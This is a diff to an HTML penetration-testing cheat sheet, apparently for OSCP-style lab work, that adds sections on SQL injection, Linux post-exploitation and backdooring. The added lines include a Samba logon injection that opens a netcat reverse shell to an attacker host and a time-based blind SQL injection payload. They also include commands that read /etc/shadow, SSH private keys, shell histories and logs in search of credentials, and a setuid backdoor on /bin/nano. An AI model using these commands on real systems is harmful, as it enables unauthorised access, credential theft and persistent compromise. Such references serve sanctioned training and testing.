@@ -72,9 +72,8 @@ nc -nv [IP_ADDRESS] [PORT_NUM]     (Grab banners manually for more clarity)
 --source-port [PORT_NUM] // -S [IP_ADDRESS]    (Spoof)
 nmap -sS -sV -Pn -T4 -vv -D [FAKE_IP_ADDRESS] [TARGET]     (TCP Decoy) 
 nmap -sU -sV -Pn -T4 -vv -D [FAKE_IP_ADDRESS] [TARGET]     (UDP Decoy)
-
-Refer to https://nmap.org/book/man-bypass-firewalls-ids.html in order to evade firewall.
 </pre>
+<p><font size="3.5" color="black">* Refer to https://nmap.org/book/man-bypass-firewalls-ids.html in order to evade firewall.</font></p>
 <hr>
 <p><h3>Nmap script and vulnerability scan</h3></p>
 <pre style="background-color:black;color:white;">
@@ -102,6 +101,20 @@ wpscan --url [URL] --enumerate ap	(Enum plugins)
 wpscan --url [URL] --enumerate u	(Enum users)
 </pre>
 <hr>
+<p><h3>SQL Injection</h3></p>
+<p><font size="3.5" color="black">Examples:</font></p>
+<p><font size="3.5" color="black">* Boolean Blind SQL Injection - https://www.youtube.com/watch?v=4LM_EIehbsU</font></p>
+<p><font size="3.5" color="black">* Time Based SQL Injection - https://www.youtube.com/watch?v=mphLv1ZCMf8 </font></p>
+<p><font size="3.5" color="black">* Error Based + upload shell https://www.youtube.com/watch?v=vPgMi7R9tvs  /  https://www.youtube.com/watch?v=0xrDZi8Qq0A</font></p>
+<p><font size="3.5" color="black">* /*/bWAPP/sqli_5.php?title=The+Dark+Knight+Rises'-if(length(database())%3d'5',sleep(5),1)%23&action=go</font></p>
+
+<p><font size="3.5" color="black">Cheat Sheets:</font></p>
+<p><font size="3.5" color="black">* https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</font></p>
+<p><font size="3.5" color="black">* https://websec.ca/kb/sql_injection#MSSQL_Default_Databases</font></p>
+<p><font size="3.5" color="black">* http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet</font></p>
+<p><font size="3.5" color="black">* https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md</font></p>
+
+<hr>
 <p><h3>Are there any NETBIOS, SMB, RPC ports discovered?</h3></p>
 <pre style="background-color:black;color:white;">
 enum4linux -a [IP_ADDRESS] (For more info - https://labs.portcullis.co.uk/tools/enum4linux/)
@@ -117,6 +130,7 @@ showmount -e [IP_ADDRESS]/[port]
 mount -t cifs //[IP_ADDRESS]/[SHARE] [LOCAL_DIR] -o username=”guest”,password=””
 rlogin [IP_ADDRESS]
 smbclient -L \\[IP_ADDRESS] -U “” -N
+smb: \> logon "/='nc [ATTACKERS_IP] [ATTACKERS_PORT] -e /bin/sh'"	(gain shell)
 nbtscan -r [IP_ADDRESS]
 net use \\[IP_ADDRESS]\$Share “” /u:””
 net view \\[IP_ADDRESS]
@@ -292,6 +306,7 @@ os.execute('/bin/sh')
 <p><font size="3.5" color="black">Windows:</font></p>
 <p><font size="3.5" color="black">- http://www.bhafsec.com/wiki/index.php/Windows_Privilege_Escalation</font></p>
 <p><font size="3.5" color="black">- http://www.fuzzysecurity.com/tutorials/16.html</font></p>
+<p><font size="3.5" color="black">- https://blog.ropnop.com/transferring-files-from-kali-to-windows/</font></p>
 <pre style="background-color:black;color:white;">
 accesschk.exe /accepteula (first thing to do in CLI access)
 accesschk.exe /accepteula -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
@@ -457,17 +472,200 @@ mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 8
 mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
 </pre>
 <p><font size="3.5" color="black">Is tunnelling possible? Send commands locally, remotely</font></p>
+<p><font size="3.5" color="black">* For more info - https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/</font></p>
 <pre style="background-color:black;color:white;">
 ssh -D 127.0.0.1:9050 -N [username]@[ip]
 proxychains ifconfig
 </pre>
+<p><font size="3.5" color="black">Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?</font></p>
+<pre style="background-color:black;color:white;">
+id
+who
+w
+last
+cat /etc/passwd | cut -d: -f1    # List of users
+grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
+awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
+cat /etc/sudoers
+sudo -l
+</pre>
+<p><font size="3.5" color="black">What sensitive files can be found?</font></p>
+<pre style="background-color:black;color:white;">
+cat /etc/passwd
+cat /etc/group
+cat /etc/shadow
+ls -alh /var/mail/
+</pre>
+<p><font size="3.5" color="black">Anything "interesting" in the home directorie(s)? If it's possible to access</font></p>
+<pre style="background-color:black;color:white;">
+ls -ahlR /root/
+ls -ahlR /home/
+</pre>
+<p><font size="3.5" color="black">Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords</font></p>
+<pre style="background-color:black;color:white;">
+cat /var/apache2/config.inc
+cat /var/lib/mysql/mysql/user.MYD
+cat /root/anaconda-ks.cfg
+</pre>
+<p><font size="3.5" color="black">What has the user/s being doing? Is there any password in plain text? What have they been edting?</font></p>
+<pre style="background-color:black;color:white;">
+find -name ".bash_history" -exec cat {} \;
+cat ~/.bash_history
+cat ~/.nano_history
+cat ~/.atftp_history
+cat ~/.mysql_history
+cat ~/.php_history
+</pre>
+<p><font size="3.5" color="black">What user information can be found?</font></p>
+<pre style="background-color:black;color:white;">
+cat ~/.bashrc
+cat ~/.profile
+cat /var/mail/root
+cat /var/spool/mail/root
+</pre>
+<p><font size="3.5" color="black">Can private-key information be found?</font></p>
+cat ~/.ssh/authorized_keys
+cat ~/.ssh/identity.pub
+cat ~/.ssh/identity
+cat ~/.ssh/id_rsa.pub
+cat ~/.ssh/id_rsa
+cat ~/.ssh/id_dsa.pub
+cat ~/.ssh/id_dsa
+cat /etc/ssh/ssh_config
+cat /etc/ssh/sshd_config
+cat /etc/ssh/ssh_host_dsa_key.pub
+cat /etc/ssh/ssh_host_dsa_key
+cat /etc/ssh/ssh_host_rsa_key.pub
+cat /etc/ssh/ssh_host_rsa_key
+cat /etc/ssh/ssh_host_key.pub
+cat /etc/ssh/ssh_host_key
+</pre>
+<p><font size="3.5" color="black">Which configuration files can be written in /etc/? Able to reconfigure a service?</font></p>
+<pre style="background-color:black;color:white;">
+ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
+ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
+ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
+ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other
+find /etc/ -readable -type f 2>/dev/null               # Anyone
+find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
+</pre>
+<p><font size="3.5" color="black">What can be found in /var/ ?</font></p>
+<pre style="background-color:black;color:white;">
+ls -alh /var/log
+ls -alh /var/mail
+ls -alh /var/spool
+ls -alh /var/spool/lpd
+ls -alh /var/lib/pgsql
+ls -alh /var/lib/mysql
+cat /var/lib/dhcp3/dhclient.leases
+</pre>
+<p><font size="3.5" color="black">Any settings/files (hidden) on website? Any settings file with database information?</font></p>
+<pre style="background-color:black;color:white;">
+ls -alhR /var/www/
+ls -alhR /srv/www/htdocs/
+ls -alhR /usr/local/www/apache22/data/
+ls -alhR /opt/lampp/htdocs/
+ls -alhR /var/www/html/
+</pre>
+<p><font size="3.5" color="black">Is there anything in the log file(s) (Could help with "Local File Includes"!)</font></p>
+<pre style="background-color:black;color:white;">
+cat /etc/httpd/logs/access_log
+cat /etc/httpd/logs/access.log
+cat /etc/httpd/logs/error_log
+cat /etc/httpd/logs/error.log
+cat /var/log/apache2/access_log
+cat /var/log/apache2/access.log
+cat /var/log/apache2/error_log
+cat /var/log/apache2/error.log
+cat /var/log/apache/access_log
+cat /var/log/apache/access.log
+cat /var/log/auth.log
+cat /var/log/chttp.log
+cat /var/log/cups/error_log
+cat /var/log/dpkg.log
+cat /var/log/faillog
+cat /var/log/httpd/access_log
+cat /var/log/httpd/access.log
+cat /var/log/httpd/error_log
+cat /var/log/httpd/error.log
+cat /var/log/lastlog
+cat /var/log/lighttpd/access.log
+cat /var/log/lighttpd/error.log
+cat /var/log/lighttpd/lighttpd.access.log
+cat /var/log/lighttpd/lighttpd.error.log
+cat /var/log/messages
+cat /var/log/secure
+cat /var/log/syslog
+cat /var/log/wtmp
+cat /var/log/xferlog
+cat /var/log/yum.log
+cat /var/run/utmp
+cat /var/webmin/miniserv.log
+cat /var/www/logs/access_log
+cat /var/www/logs/access.log
+ls -alh /var/lib/dhcp3/
+ls -alh /var/log/postgresql/
+ls -alh /var/log/proftpd/
+ls -alh /var/log/samba/
 
+Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
+</pre>
+<p><font size="3.5" color="black">Any settings/files (hidden) on website? Any settings file with database information?</font></p>
+<pre style="background-color:black;color:white;">
+ls -alhR /var/www/
+ls -alhR /srv/www/htdocs/
+ls -alhR /usr/local/www/apache22/data/
+ls -alhR /opt/lampp/htdocs/
+ls -alhR /var/www/html/
+</pre>
+<p><font size="3.5" color="black">How are file-systems mounted?</font></p>
+<pre style="background-color:black;color:white;">
+mount
+df -h
+</pre>
+<p><font size="3.5" color="black">Are there any unmounted file-systems?</font></p>
+<pre style="background-color:black;color:white;">
+cat /etc/fstab
+</pre>
+<p><font size="3.5" color="black">What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID</font></p>
+<pre style="background-color:black;color:white;">
+find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
+find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
+find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
+for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
 
-
-
-
-
-
+# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+</pre>
+<p><font size="3.5" color="black">Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm</font></p>
+<pre style="background-color:black;color:white;">
+find / -writable -type d 2>/dev/null      # world-writeable folders
+find / -perm -222 -type d 2>/dev/null     # world-writeable folders
+find / -perm -o w -type d 2>/dev/null     # world-writeable folders
+find / -perm -o x -type d 2>/dev/null     # world-executable folders
+find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
+</pre>
+<p><font size="3.5" color="black">Any "problem" files? Word-writeable, "nobody" files</font></p>
+<pre style="background-color:black;color:white;">
+find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
+find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
+</pre>
+<p><font size="3.5" color="black">What development tools/languages are installed/supported?</font></p>
+<pre style="background-color:black;color:white;">
+find / -name perl*
+find / -name python*
+find / -name gcc*
+find / -name cc
+</pre>
+<p><font size="3.5" color="black">How can files be uploaded?</font></p>
+<pre style="background-color:black;color:white;">
+find / -name wget
+find / -name nc*
+find / -name netcat*
+find / -name tftp*
+find / -name ftp
+</pre>
 <hr>
 <p><h3>Are there any exploits available publicly from the services discovered?</h3></p>
 <pre style="background-color:black;color:white;">
@@ -476,21 +674,34 @@ getsploit [VERSION]
 <p><font size="3.5" color="black">- Precompiled windows exploits - https://github.com/abatchy17/WindowsExploits</font></p>
 <p><font size="3.5" color="black">- Windows kernel exploits - https://github.com/SecWiki/windows-kernel-exploits</font></p>
 <p><font size="3.5" color="black">- Linux kernel exploits - https://github.com/SecWiki/linux-kernel-exploits</font></p>
-<p><font size="3.5" color="black">- http://1337day.com</font></p>
+<p><font size="3.5" color="black">- https://cxsecurity.com/</font></p>
+<p><font size="3.5" color="black">- http://seclists.org/fulldisclosure/</font></p>
 <p><font size="3.5" color="black">- http://www.securiteam.com</font></p>
 <p><font size="3.5" color="black">- http://www.securityfocus.com</font></p>
-<p><font size="3.5" color="black">- http://www.exploitsearch.net</font></p>
-<p><font size="3.5" color="black">- http://metasploit.com/modules/</font></p>
-<p><font size="3.5" color="black">- http://securityreason.com</font></p>
-<p><font size="3.5" color="black">- http://seclists.org/fulldisclosure/</font></p>
 <p><font size="3.5" color="black">- http://www.google.com</font></p>
-
-
+<hr>
+<p><h3>Backdooring</h3></p>
+<pre style="background-color:black;color:white;">
+setuid bit combina (root permissions required) - https://gist.github.com/dergachev/7916152
+ls -al /bin/nano       #    -rwxr-xr-x 1 root root 191976 2010-02-01 20:30 /bin/nano
+chmod u+s /bin/nano    # installs the backdoor
+</pre>
+<hr>
+<p><h3>More</h3></p>
+<pre style="background-color:black;color:white;">
+sort [WORDLIST_PATH] | uniq          (Outputs unique words in a wordlist that is found)
+sort [WORDLIST_PATH] | uniq | wc -l  (sorts number of unique words in a wordlist that is found)
+ip -4 addr show scope global    /*Determine interfaces ip address + prefix*/
+ip route show | grep default    /*Determine which interface is public*/
+</pre>
+<hr>
 <p><h3>Other (quick) guides & Links</h3></p>
 <p><font size="3.5" color="black">Decrypting TLS Browser Traffic With Wireshark - https://jimshaver.net/2015/02/11/decrypting-tls-browser-traffic-with-wireshark-the-easy-way/</font></p>
 <p><font size="3.5" color="black">Enumeration - http://www.0daysecurity.com/penetration-testing/enumeration.html</font></p>
 <p><font size="3.5" color="black">Misc - http://jon.oberheide.org/files/stackjacking-infiltrate11.pdf</font></p>
 <p><font size="3.5" color="black">Misc - http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html</font></p>
+<p><font size="3.5" color="black">PT - https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/</font></p>
+<p><font size="3.5" color="black">PT - https://github.com/chouaibhm/OSCP-Survival-Guide-1/blob/master/OSCP_Helpful_Links.md</font></p>
 <hr>
 </div>
 </div>
